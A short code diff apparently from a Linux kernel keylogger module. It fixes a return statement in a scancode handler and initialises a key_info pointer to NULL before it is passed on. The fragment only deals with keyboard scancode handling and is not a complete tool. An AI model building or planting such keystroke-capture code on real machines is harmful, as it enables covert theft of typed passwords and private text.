@@ -109,7 +109,7 @@ void	handle_scancode(struct key_info *key)
 	if (scancode == 0xe0)
 	{
 		multicode = 1;
-		return IRQ_HANDLED;
+		return;
 	}
 	if (multicode)
 	{
@@ -123,7 +123,7 @@ void	handle_scancode(struct key_info *key)
 static irqreturn_t keylogger_handle(int irq_n, void *data)
 {
 	t_keylogger_data	*logs = (t_keylogger_data *)data;
-	struct key_info *key;
+	struct key_info *key = NULL;
 	(void)logs;
 
 	handle_scancode(key);
